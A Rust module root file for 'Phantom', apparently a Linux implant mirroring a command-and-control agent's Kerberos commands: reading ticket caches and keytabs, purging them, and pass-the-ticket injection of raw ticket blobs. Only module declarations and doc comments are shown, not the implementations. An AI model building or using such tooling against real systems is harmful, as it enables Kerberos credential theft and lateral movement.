//! Linux Kerberos operations for Phantom.
//!
//! Implements the Linux equivalents of the Demon `COMMAND_KERBEROS` subcommands:
//!
//! - **LUID** → returns the current Unix UID (no Windows LUID on Linux).
//! - **KLIST** → parses MIT Kerberos ccache files (`$KRB5CCNAME` or `/tmp/krb5cc_*`).
//! - **PURGE** → destroys ccache files.
//! - **PTT** → writes a raw ticket blob into a new ccache file.
//!
//! Ccache parsing follows the MIT Kerberos **file format version 0x0504** (v4).
//! Keytab parsing follows the MIT Kerberos **keytab format version 0x0502** (v2).

pub(crate) mod ccache;
pub(crate) mod format;
pub(crate) mod keytab;
pub(crate) mod ops;

pub(crate) use ccache::parse_ccache;
pub(crate) use format::{format_keytabs, format_klist};
pub(crate) use keytab::parse_keytab;
pub(crate) use ops::{
    inject_ticket, purge_ccache_files, resolve_ccache_paths, resolve_keytab_paths,
};

#[cfg(test)]
mod tests;
